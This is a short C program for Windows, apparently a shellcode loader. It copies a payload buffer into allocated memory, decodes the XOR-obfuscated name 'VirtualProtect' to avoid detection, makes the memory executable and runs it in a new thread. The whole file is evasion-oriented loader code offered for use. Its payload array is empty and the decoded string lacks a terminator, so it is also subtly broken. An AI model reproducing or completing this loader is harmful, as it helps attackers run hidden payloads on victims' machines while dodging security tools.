# include <stdio.h>
# include <windows.h>
# include <stdlib.h>
unsigned char buf[] = {};
BOOL (WINAPI *VP)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
void main () {

   
   HANDLE threadid;
    
   
   DWORD th;
   int rt;
   DWORD oldprotect=0;
   void * addr;
   addr=VirtualAlloc(0,sizeof(buf),MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
   BOOL rv;
   // addedd the Obfuscated String Here "VirtualProtect" using XOR encryption
   unsigned char VPs[]={0x17,0x28,0x33,0x35,0x34,0x20,0x2d,0x11,0x33,0x2e,0x35,0x24,0x22,0x35};
   RtlMoveMemory(addr,buf,sizeof(buf));
   // decrypting the string 
   for(int i=0;i<sizeof(VPs);i++){
       *(VPs+i)=*(VPs + i) ^ 'A';
   }
   //getting process for "VirtaulProtect"
   VP=GetProcAddress(GetModuleHandle("kernel32.dll"),VPs);
   // using VirtualProtect
   rv=VP(addr,sizeof(buf),PAGE_EXECUTE_READ,&oldprotect);
   if(rv !=0){
      threadid=CreateThread(0,0,(LPTHREAD_START_ROUTINE) addr,0,0,0);
      WaitForSingleObject(threadid,-1);
   }
   else{
      printf("heellll");
   }
   
}
